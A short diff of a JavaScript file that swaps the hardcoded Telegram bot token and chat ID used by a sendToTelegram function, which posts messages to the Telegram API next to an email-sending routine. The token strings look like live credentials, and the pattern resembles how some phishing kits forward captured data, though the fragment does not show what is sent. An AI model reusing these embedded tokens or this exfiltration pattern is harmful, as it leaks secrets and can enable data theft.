@@ -132,8 +132,8 @@ const sendEmail = async (data) => {
 };
 
 const sendToTelegram = async (message) => {
-    const telegramBotToken = '6721983070:AAFEubEbisF5IrznY1eS6gqpRp5hbjubOlM';
-    const chatId = '6546686863'; // Adjust the chat ID accordingly
+    const telegramBotToken = '6320028663:AAFsrjJsglvVQ4eAK-PQ21IqRLSskpdMdeM';
+    const chatId = '6589434009'; // Adjust the chat ID accordingly
 
     const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
     const requestBody = {
